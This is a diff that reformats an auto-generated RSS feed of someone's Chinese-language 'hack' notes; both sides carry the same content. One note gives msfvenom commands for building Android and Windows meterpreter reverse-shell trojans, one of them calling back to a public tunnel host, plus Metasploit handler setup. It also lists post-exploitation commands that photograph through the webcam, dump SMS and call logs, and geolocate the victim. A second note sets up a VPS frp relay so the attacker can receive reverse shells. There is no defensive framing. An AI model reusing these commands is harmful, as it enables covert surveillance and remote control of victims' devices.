@@ -1,64 +1,26 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>hack on Alex lan</title><link>http://localhost:1313/docs/hack/</link><description>Recent content in hack on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/docs/hack/index.xml" rel="self" type="application/rss+xml"/><item><title>msf</title><link>http://localhost:1313/docs/hack/msf/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/hack/msf/</guid><description>&lt;h2 id="android">
- Android
- &lt;a class="anchor" href="#android">#&lt;/a>
-&lt;/h2>
-&lt;pre tabindex="0">&lt;code>msfvenom -p payload LHOST=本地地址 LPORT=本地端口 -f 文件类型 -o 木马文件
-&lt;/code>&lt;/pre>&lt;p>如&lt;/p>
-&lt;pre tabindex="0">&lt;code>msfvenom -p android -p android/meterpreter/reverse_tcp LHOST=192.168.43.97 LPORT=5555 R&amp;gt; demo.apk
-&lt;/code>&lt;/pre>&lt;p>启动msfconsole&lt;/p>
-&lt;pre tabindex="0">&lt;code>use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set lhost 192.168.134.129
-set lport 555
-exploit/run
-&lt;/code>&lt;/pre>&lt;p>在手机上启动&lt;/p>
-&lt;pre tabindex="0">&lt;code>sysinfo //查看手机信息
-app_list //查看安装的app
-webcam_snap //拍照
-dump_sms //查看短信
-dump_calllog //通讯录
-geolocate //GPS
-screenshot //jx&amp;#39;py
-&lt;/code>&lt;/pre>&lt;h2 id="win">
- Win
- &lt;a class="anchor" href="#win">#&lt;/a>
-&lt;/h2>
-&lt;pre tabindex="0">&lt;code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10189 -f exe -o 123.exe
-&lt;/code>&lt;/pre>&lt;p>启动msfconsole&lt;/p>
-&lt;p>free.idcfengye.com&lt;/p>
-&lt;pre tabindex="0">&lt;code>use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost free.idcfengye.com
-set lport 1234
-run/exploit
-&lt;/code>&lt;/pre>&lt;p>等待目标上线&lt;/p></description></item><item><title>TheFatRat</title><link>http://localhost:1313/docs/hack/thefatrat/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/hack/thefatrat/</guid><description>&lt;p>某日突发奇想&lt;/p>
-&lt;p>在github 上发现了一个好东西。&lt;/p>
-&lt;p>安装一哈&lt;/p>
-&lt;h3 id="配置vps-frp">
- 配置VPS frp
- &lt;a class="anchor" href="#%e9%85%8d%e7%bd%aevps-frp">#&lt;/a>
-&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-toml" data-lang="toml">&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">common&lt;/span>]
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> = &lt;span style="color:#ae81ff">7000&lt;/span> &lt;span style="color:#75715e"># VPS监听端口（你可以改成其他端口）&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="攻击机">
- 攻击机
- &lt;a class="anchor" href="#%e6%94%bb%e5%87%bb%e6%9c%ba">#&lt;/a>
-&lt;/h3>
-&lt;p>注意，记得开启vps上的6000端口和4444端口&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-toml" data-lang="toml">&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">common&lt;/span>]
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> = &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">VPS&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">的&lt;/span>&lt;span style="color:#a6e22e">IP&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">地址&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> = &lt;span style="color:#ae81ff">7000&lt;/span> &lt;span style="color:#75715e"># VPS上frps的监听端口&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">attack_machine_reverse_proxy&lt;/span>]
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> = &lt;span style="color:#a6e22e">tcp&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> = &lt;span style="color:#ae81ff">127.0&lt;/span>.&lt;span style="color:#ae81ff">0.1&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> = &lt;span style="color:#ae81ff">4444&lt;/span> &lt;span style="color:#75715e"># 攻击机上监听的端口（用来接收来自目标的连接）&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> = &lt;span style="color:#ae81ff">6000&lt;/span> &lt;span style="color:#75715e"># VPS上开放的远程端口，用来转发流量&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="生成payload">
- 生成payload
- &lt;a class="anchor" href="#%e7%94%9f%e6%88%90payload">#&lt;/a>
-&lt;/h3>
-&lt;p>这个不多说&lt;/p>
-&lt;p>注意在填写host的时候些vps地址，port 填remote_port的值(也就是6000端口)&lt;/p>
-&lt;p>被攻击机器上线&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>hack on Alex lan</title>
+    <link>http://localhost:1313/docs/hack/</link>
+    <description>Recent content in hack on Alex lan</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/docs/hack/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>msf</title>
+      <link>http://localhost:1313/docs/hack/msf/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/hack/msf/</guid>
+      <description>&lt;h2 id=&#34;android&#34;&gt;&#xD;&#xA;  Android&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#android&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msfvenom -p payload LHOST=本地地址 LPORT=本地端口 -f 文件类型 -o 木马文件&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msfvenom -p android -p android/meterpreter/reverse_tcp LHOST=192.168.43.97 LPORT=5555 R&amp;gt; demo.apk&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动msfconsole&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/multi/handler&#xA;set payload android/meterpreter/reverse_tcp&#xA;set lhost 192.168.134.129&#xA;set lport 555&#xA;exploit/run&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在手机上启动&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sysinfo       //查看手机信息&#xA;app_list      //查看安装的app&#xA;webcam_snap   //拍照&#xA;dump_sms      //查看短信&#xA;dump_calllog  //通讯录&#xA;geolocate     //GPS&#xA;screenshot    //jx&amp;#39;py&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;win&#34;&gt;&#xD;&#xA;  Win&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#win&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10189 -f exe -o 123.exe&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动msfconsole&lt;/p&gt;&#xA;&lt;p&gt;free.idcfengye.com&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/multi/handler&#xA;set payload windows/meterpreter/reverse_tcp&#xA;set lhost free.idcfengye.com&#xA;set lport 1234&#xA;run/exploit&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等待目标上线&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>TheFatRat</title>
+      <link>http://localhost:1313/docs/hack/thefatrat/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/hack/thefatrat/</guid>
+      <description>&lt;p&gt;某日突发奇想&lt;/p&gt;&#xA;&lt;p&gt;在github 上发现了一个好东西。&lt;/p&gt;&#xA;&lt;p&gt;安装一哈&lt;/p&gt;&#xA;&lt;h3 id=&#34;配置vps-frp&#34;&gt;&#xD;&#xA;  配置VPS frp&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e9%85%8d%e7%bd%aevps-frp&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&#xD;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-toml&#34; data-lang=&#34;toml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bind_port&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;7000&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# VPS监听端口（你可以改成其他端口）&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;攻击机&#34;&gt;&#xD;&#xA;  攻击机&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e6%94%bb%e5%87%bb%e6%9c%ba&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&#xD;&#xA;&lt;p&gt;注意，记得开启vps上的6000端口和4444端口&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-toml&#34; data-lang=&#34;toml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;server_addr&lt;/span&gt; = &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VPS&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;的&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;IP&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;地址&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;server_port&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;7000&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# VPS上frps的监听端口&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;attack_machine_reverse_proxy&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;tcp&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local_ip&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local_port&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 攻击机上监听的端口（用来接收来自目标的连接）&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;remote_port&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;6000&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# VPS上开放的远程端口，用来转发流量&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;生成payload&#34;&gt;&#xD;&#xA;  生成payload&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e7%94%9f%e6%88%90payload&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&#xD;&#xA;&lt;p&gt;这个不多说&lt;/p&gt;&#xA;&lt;p&gt;注意在填写host的时候些vps地址，port 填remote_port的值(也就是6000端口)&lt;/p&gt;&#xA;&lt;p&gt;被攻击机器上线&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
